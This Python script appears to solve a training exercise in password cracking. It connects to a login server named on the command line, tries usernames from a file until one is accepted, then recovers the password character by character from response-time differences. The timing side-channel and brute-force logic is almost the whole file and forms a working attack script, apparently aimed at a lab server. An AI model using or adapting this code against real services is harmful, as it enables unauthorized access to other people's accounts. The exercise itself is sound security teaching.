from datetime import datetime
from pprint import pprint
import json
from itertools import product
import socket
from string import ascii_letters, ascii_lowercase, digits
import sys


def get_all_combinations(str_pas: str):
    if not set(ascii_lowercase) & set(str_pas):
        yield str_pas
    else:
        indexes_letters = [i for i, c in enumerate(str_pas) if c in ascii_lowercase]
        num_letters = len(indexes_letters)

        for comb in product("12", repeat=num_letters):
            list_pas = list(str_pas)
            for low_up, ind in zip(comb, indexes_letters):
                sym = list_pas[ind]
                list_pas[ind] = sym.upper() if low_up == "2" else sym.lower()
            yield "".join(list_pas)


def make_json_message(login, password=" "):
    return json.dumps({"login": login, "password": password})


_, localhost, port = sys.argv
symbols = ascii_letters + digits

with socket.socket() as client_sock:
    client_sock.connect((localhost, int(port)))
    stop = False

    with open("d:/logins.txt") as f:
        for log_adm in f:
            log_result = log_adm.strip()
            message_login = make_json_message(log_result).encode()

            client_sock.send(message_login)
            resp = client_sock.recv(1024)
            if json.loads(resp.decode())["result"] != "Wrong login!":
                break

        pas = ""
        while True:
            prev_delay = None
            prev_c = ""
            log_dict = {}

            for c in symbols:
                test_pas = pas + c
                message_pas = make_json_message(log_result, test_pas).encode()

                start = datetime.now()

                client_sock.send(message_pas)
                resp = client_sock.recv(1024)

                delay = datetime.now() - start

                response_pass = json.loads(resp.decode())
                stop = response_pass["result"] == "Connection success!"
                if stop:
                    pas += c
                    break

                log_dict[c] = delay.microseconds

            if stop:
                break
            else:
                pas += max(log_dict, key=log_dict.get)

    print(make_json_message(log_result, pas))
